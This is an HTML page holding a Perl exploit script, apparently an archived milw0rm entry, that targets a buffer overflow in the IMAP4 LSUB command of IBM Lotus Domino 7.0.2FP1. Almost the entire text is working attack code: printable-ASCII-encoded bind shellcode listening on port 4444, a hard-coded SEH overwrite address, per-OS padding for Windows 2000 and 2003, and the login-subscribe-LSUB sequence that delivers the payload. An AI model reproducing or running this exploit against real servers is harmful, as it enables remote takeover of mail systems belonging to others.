<html><head><title>IBM Lotus Domino 7.0.2FP1 IMAP4 Server LSUB Command Exploit</title></head><pre>#!perl
#
# &quot;IBM Lotus Domino&quot; IMAP4 Server 'LSUB' Command Exploit
#
# Author:  Manuel Santamarina Suarez
# e-Mail:  FistFuXXer@gmx.de
#

use IO::Socket;
use File::Basename;

#
# destination TCP port
#
$port = 143;

#
# SE handler
#
# You can only use HEX values from 0x20 to 0x7e! (printable ASCII characters)
# You must use a POP/POP/RET sequence that doesn't modify the ESP register or
# the shellcode decoder will fail.
#
$seh = reverse( &quot;\x60\x21\x53\x4E&quot; );  # POP EDI/POP EBP/RET
                                       # nnotes.6021534e
                                       # universal on Lotus Domino 7.0.2FP1


#
# Shellcode
# You can only use HEX values from 0x20 to 0x7e! (printable ASCII characters)
#
# 1. Step: Modified Win32 Bind Shellcode (EXITFUNC=thread, LPORT=4444)
# 2. Step: Encoded with Alpha 2.0 (BASEADDRESS=ESP)
#
$sc = &quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIeyZiMSKYnPYI&quot;.
      &quot;JNJy0tGTydqKOqcCDS2wDWLMnzmSxkYlkRYdLksMRFhWoOZNbRe5mxBWuVHvqcFS&quot;.
      &quot;7vIORKmLzQmOToWf3RvqWhTOUViUD7Wfqvn3yLusEVmKMiuvBmuSkKNsrmzNpPhV&quot;.
      &quot;bgOgpVIEsVRNpl2cOYnRDbl26fJePsR6cVkLKlUKO6TQWx6kLLpqRtGKVftSekP3&quot;.
      &quot;OaKKlTgVV6KNyLqDoMtQB75KWvJJ0KoJGvzzSog9M5ftwiwisQkzMxiQXkyYDqqo&quot;.
      &quot;ONy8uocPKNMxUX2crRPJWOKlsPavRLQWQbPLs8MNphKLZvXznenx5RamlOQumWQo&quot;.
      &quot;btLSI2OJYJe5mQ0DyNyY7tctxNJiR4pDcBpJUaCOmLo6uaPDVdcKyRSOUyOpewzp&quot;.
      &quot;ZzPeMQSMmMZkdBkXaMZRl3lzLcBSUPM8skzitBixQMibMbaNfkXSWp9xSkzjUSRc&quot;.
      &quot;hX2EMWOt8eQmdn8QJTHMNHIQKhpemWRQYwkNvQSOXnL7yN9bXgiZfnGNQQUClp3M&quot;.
      &quot;HIECH5WVPM59KMkYZolwliSeoQwyJzBMH5FQYlMlJEHhLiLdOkQu5rpS2RrltL70&quot;.
      &quot;YO8KFfqVm7mKtFcvxXzkoXKwxe6WLNuB3sYYY8kqm73UlhEp0rQZKl1PbQDYOcPs&quot;.
      &quot;RRRlfem8aMibLxKi0mij5TKXQKcUk76wlMLZA&quot;;

#
# JUMP to 'ESP adjustment' and shellcode
#
$jmp = &quot;\x74\x20&quot;.  # JE SHORT
       &quot;\x75\x20&quot;;  # JNZ SHORT


#
#
# Don't edit anything after this line
#
#

$sc_limit = 2300;

sub usage {
    print &quot;Usage: &quot; . basename( $0 ) . &quot; [target] [IPv4 address] [username] [password]\n&quot;.
          &quot;Example: &quot;. basename( $0 ) . &quot; 1 192.168.1.19 \&quot;Bill Gates/ServerName\&quot; \&quot;P4ssw0rd\&quot;\n&quot;.
          &quot;\n&quot;.
          &quot;Targets:\n&quot;.
          &quot;[1]  Lotus Domino 7.0.2FP1 on Windows Server 2000 SP4\n&quot;.
          &quot;[2]  Lotus Domino 7.0.2FP1 on Windows Server 2003 SP2\n&quot;;
    exit;
}


# Net::IP::ip_is_ipv4
sub ip_is_ipv4 {
    my $ip = shift;

    unless ($ip =~ m/^[\d\.]+$/) {
        return 0;
    }

    if ($ip =~ m/^\./) {
        return 0;
    }

    if ($ip =~ m/\.$/) {
        return 0;
    }

    if ($ip =~ m/^(\d+)$/ and $1 &lt; 256) {
        return 1
    }

    my $n = ($ip =~ tr/\./\./);

    unless ($n &gt;= 0 and $n &lt; 4) {
        return 0;
    }

    if ($ip =~ m/\.\./) {
        return 0;
    }

    foreach (split /\./, $ip) {
        unless ($_ &gt;= 0 and $_ &lt; 256) {
            return 0;
        }
    }
    
    return 1;
}


print &quot;--------------------------------------------------------\n&quot;.
      ' &quot;IBM Lotus Domino&quot; IMAP4 Server \'LSUB\' Command Exploit'.&quot;\n&quot;.
      &quot;--------------------------------------------------------\n\n&quot;;

if( ($#ARGV+1) != 4 ) {
    &amp;usage;
}

$user = $ARGV[2];
$pass = $ARGV[3];

# Windows 2000 SP4
if( $ARGV[0] == 1 ) {
    $popad = &quot;\x41&quot; x 3 .  # INC ECX
             &quot;\x61&quot; x 51;  # POPAD
}
# Windows 2003 SP2
elsif( $ARGV[0] == 2 ) {
    $popad = &quot;\x41&quot; x 2 .  # INC ECX
             &quot;\x61&quot; x 52;  # POPAD
}
else {
    &amp;usage;
}
    
if( ip_is_ipv4( $ARGV[1] ) ) {
    $ip = $ARGV[1];
}
else
{
    &amp;usage;
}

if( length( $sc ) &gt; $sc_limit ) {
    print &quot;[-] Error: Shellcode's size exceeds $sc_limit bytes!\n&quot;;
    exit;
}

print &quot;[+] Connecting to $ip:$port...\n&quot;;

$sock = IO::Socket::INET-&gt;new (
    PeerAddr =&gt; $ip,
    PeerPort =&gt; $port,
    Proto    =&gt; 'tcp',
    Timeout  =&gt; 2
) or print &quot;[-] Error: Couldn't establish a connection to $ip:$port!\n&quot; and exit;

print &quot;[+] Connected.\n&quot;;

$mailbox = &quot;\x44&quot; x 280 . $jmp . $seh . &quot;\x44&quot; x 26 . $popad . $sc . &quot;\x44&quot; x 3000;
$sock-&gt;recv( $recv, 1024 );
$sock-&gt;send( &quot;a001 LOGIN \&quot;$user\&quot; \&quot;$pass\&quot;\r\n&quot; );
$sock-&gt;recv( $recv, 1024 );

if( $recv ne &quot;a001 OK LOGIN completed\r\n&quot; ) {
    print &quot;[-] Error: Invalid username or password!\n&quot;;
    exit;
}

print &quot;[+] Successfully logged in.\n&quot;.
      &quot;[+] Trying to overwrite and control the SE handler...\n&quot;;

$sock-&gt;send( &quot;a002 SUBSCRIBE {&quot; . length( $mailbox ) . &quot;}\r\n&quot; );
$sock-&gt;recv( $recv, 1024 );
$sock-&gt;send( &quot;$mailbox\r\n&quot; );
$sock-&gt;recv( $recv, 1024 );
$sock-&gt;send( &quot;a003 LSUB arg1 arg2\r\n&quot; );
sleep( 3 );
close( $sock );

print &quot;[+] Done. Now check for a bind shell on $ip:4444!\n&quot;;

# milw0rm.com [2007-10-27]</pre></html>